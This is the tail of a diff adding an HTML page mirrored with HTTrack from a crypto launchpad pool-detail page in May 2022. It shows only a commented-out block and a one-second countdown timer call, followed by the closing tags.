+            //     if(today < kinechnaya_vrema){
+            //         console.log("XXXX");
+            //     window.clearInterval(updateTimer);
+            // }
+            }          
+                var id = setInterval(updateTimer, 1000);
+         
+
+
+      </script>
+</body>
+
+<!-- Mirrored from lauchpad-seedify.fund/pool_detail/ongoing/engines_of_fury/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 May 2022 04:57:22 GMT -->
+</html>
